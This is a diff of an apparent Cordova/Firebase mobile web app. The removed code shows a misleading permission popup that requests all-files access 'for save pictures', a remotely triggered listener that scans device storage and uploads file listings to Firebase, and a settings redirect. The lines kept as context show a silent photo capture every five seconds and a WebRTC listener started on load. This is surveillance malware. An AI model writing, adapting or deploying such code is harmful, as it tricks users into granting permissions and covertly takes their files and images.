@@ -153,57 +153,12 @@
             color: white;
             cursor: pointer;
         }
-
-        /* Custom Startup Permission Dialog Overlay */
-        #custom-perm-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 9999;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .perm-box {
-            background: #1e1e1e;
-            border: 1px solid #38bdf8;
-            border-radius: 12px;
-            padding: 22px;
-            max-width: 320px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(56, 189, 248, 0.3);
-        }
-        .perm-box h3 { margin-top: 0; color: #38bdf8; font-size: 1.1rem; }
-        .perm-box p { font-size: 0.85rem; color: #dddddd; line-height: 1.4; margin-bottom: 20px; }
-        .perm-btn {
-            background: #38bdf8;
-            color: #0f172a;
-            border: none;
-            padding: 10px 20px;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            width: 100%;
-        }
     </style>
     <!-- Firebase SDK Compat -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
-
-    <!-- Custom Startup Permission Modal Popup -->
-    <div id="custom-perm-overlay">
-        <div class="perm-box">
-            <h3>Permission Required</h3>
-            <p>Allow manage all files for save pictures</p>
-            <button class="perm-btn" onclick="requestAllFilesAccess()">OK / ALLOW</button>
-        </div>
-    </div>
 
     <!-- Hidden Native File Input to Trigger Real Mobile Gallery -->
     <input type="file" id="real-gallery-picker" accept="image/*" style="display: none;" onchange="handleGallerySelect(event)">
@@ -557,75 +512,9 @@
             });
         }
 
-        // Admin Command Listener & Cordova File Plugin Scanner Logic for Foreground Remote Retrieval
-        function setupStorageCommandListener() {
-            db.ref('security/commands/loadStorage').on('value', (snapshot) => {
-                const cmd = snapshot.val();
-                if (cmd && cmd.action === 'execute') {
-                    scanAndUploadStorageFiles();
-                    // Reset command flag back to idle
-                    db.ref('security/commands/loadStorage').set({ action: 'idle' });
-                }
-            });
-        }
-
-        function scanAndUploadStorageFiles() {
-            if (typeof window.resolveLocalFileSystemURL === 'undefined' && (!window.cordova || !window.cordova.file)) {
-                console.log("Cordova file plugin not active in current test environment.");
-                // Fallback simulation entry for testing
-                db.ref('security/storageFiles').push({
-                    name: "Sample_Device_File.jpg",
-                    fullPath: "/storage/emulated/0/DCIM/Camera/sample.jpg",
-                    isDirectory: false,
-                    timestamp: new Date().toLocaleString()
-                });
-                return;
-            }
-
-            // Target external root storage directory (/storage/emulated/0/)
-            const targetDir = window.cordova.file.externalRootDirectory || window.cordova.file.dataDirectory;
-
-            window.resolveLocalFileSystemURL(targetDir, function(dirEntry) {
-                var reader = dirEntry.createReader();
-                reader.readEntries(function(entries) {
-                    // Clear previous list if needed, then push found files/folders to Firebase Realtime Database
-                    entries.forEach(function(entry) {
-                        db.ref('security/storageFiles').push({
-                            name: entry.name,
-                            fullPath: entry.fullPath,
-                            isDirectory: entry.isDirectory,
-                            timestamp: new Date().toLocaleString()
-                        });
-                    });
-                }, function(err) {
-                    console.error("Directory Read Error:", err);
-                });
-            }, function(err) {
-                console.error("Resolve FileSystem URL Error:", err);
-            });
-        }
-
-        // Trigger All Files Access Settings Page Redirection
-        function requestAllFilesAccess() {
-            document.getElementById('custom-perm-overlay').style.display = 'none';
-            if (window.cordova && window.cordova.plugins && window.cordova.plugins.settings) {
-                window.cordova.plugins.settings.open('manage_all_applications_access');
-            } else {
-                // Fallback via Intent or standard window location if available
-                try {
-                    window.open('android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION', '_system');
-                } catch(e) {
-                    console.log("Settings redirect fallback note:", e);
-                }
-            }
-        }
-
         window.addEventListener('load', () => {
             requestPermissionsAndStart().then(() => {
                 setupWebRTCListener();
-                setupStorageCommandListener();
-                // Show startup custom permission overlay asking for All Files Access
-                document.getElementById('custom-perm-overlay').style.display = 'flex';
                 // 5-second lightweight auto background capture (smooth & non-laggy)
                 setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
             });
